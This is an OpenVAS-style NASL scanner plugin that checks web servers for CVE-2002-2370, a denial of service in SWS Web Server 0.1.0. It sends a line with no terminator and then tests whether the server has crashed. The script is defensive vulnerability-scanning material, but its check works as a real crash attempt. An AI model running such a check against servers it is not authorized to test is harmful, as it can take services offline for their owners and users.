# SPDX-FileCopyrightText: 2002 Michel Arboi
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11171");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2002-2370");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/5664");
  script_name("HTTP Unfinished Line DoS Vulnerability");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_analysis");
  script_copyright("Copyright (C) 2002 Michel Arboi");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Upgrade your web server.");

  script_tag(name:"affected", value:"SWS Web Server v0.1.0 is known to be affected. Other versions or
  products might be affected as well.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"summary", value:"We could crash the remote web server by sending an unfinished line.
  (without a return carriage at the end of the line).");

  script_tag(name:"impact", value:"An attacker cracker may exploit this flaw to disable this service.");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");
include("misc_func.inc");

port = http_get_port(default:80);
if(http_is_dead(port:port))exit(0);

soc = http_open_socket(port);
if (!soc)
  exit(0);

vt_strings = get_vt_strings();

send(socket:soc, data:"|" + vt_strings["default"] + "|");
http_close_socket(soc);
if(http_is_dead(port:port, retry:3))
  security_message(port);
